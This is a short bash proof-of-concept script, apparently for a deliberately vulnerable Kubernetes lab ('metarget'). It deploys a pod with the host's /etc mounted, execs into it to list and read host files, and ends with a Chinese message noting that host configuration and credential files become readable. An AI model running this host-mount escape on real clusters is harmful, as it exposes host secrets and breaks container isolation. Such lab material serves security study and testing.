#!/usr/bin/env bash
set -Eeuo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST="$POC_DIR/scene.yaml"
NAMESPACE="${NAMESPACE:-metarget}"

if [[ "${1:-}" == "--cleanup" ]]; then
  kubectl delete -f "$MANIFEST" --ignore-not-found
  echo "[+] Cleaned resources from $MANIFEST"
  exit 0
fi

command -v kubectl >/dev/null 2>&1 || { echo "[-] Missing dependency: kubectl"; exit 1; }

kubectl apply -f "$MANIFEST"
kubectl wait --for=condition=Ready "pod/mount-host-etc" -n "$NAMESPACE" --timeout=120s || true
kubectl exec -n "$NAMESPACE" "mount-host-etc" -- sh -lc 'id; ls /host-etc | head; cat /host-etc/hostname || true'

echo "[*] 可直接读取宿主机配置、凭据类文件（按权限限制）。"
